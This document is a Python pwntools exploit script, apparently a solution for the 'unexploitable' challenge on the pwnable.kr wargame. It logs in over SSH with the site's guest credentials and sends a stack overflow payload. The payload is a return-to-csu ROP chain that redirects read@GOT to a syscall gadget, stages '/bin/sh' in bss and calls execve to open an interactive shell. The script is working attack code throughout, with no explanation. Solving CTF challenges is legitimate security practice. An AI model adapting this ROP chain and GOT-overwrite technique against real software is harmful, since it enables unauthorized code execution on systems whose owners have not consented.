from pwn import *

s = ssh(user='unexploitable',host='pwnable.kr',port=2222, password ='guest')
p = s.process("./unexploitable")
e = ELF('./unexploitable')


bss = e.bss()
read_plt = e.plt['read']
read_got = e.got['read']

csu_init1 = 0x4005e6
csu_init2 = 0x4005d0


def rtc_chain(func, arg1, arg2, arg3):
    return p64(0) + p64(0) + p64(1) + p64(func) + p64(arg1) + p64(arg2) + p64(arg3) + p64(csu_init2)


payload = b'A' * 24

# read(0, bss, 8) => bss: "/bin/sh"
payload += p64(csu_init1)
payload += rtc_chain(read_got, 0, bss, 8)

# read(0, read@got, 1) => read -> syscall 
payload += rtc_chain(read_got, 0, read_got, 1)

# syscall(1, bss, 0x3b) => write(1, bss, 0x3b)
payload += rtc_chain(read_got, 1, bss, 0x3b )

# syscall(bss, 0, 0) => execve("/bin/sh", 0, 0)
payload += rtc_chain(read_got, bss, 0, 0 )


p.send(payload)
sleep(3)

p.send('/bin/sh\x00')
sleep(3)

p.send('\x5e')
p.recv(0x3b)

p.interactive()
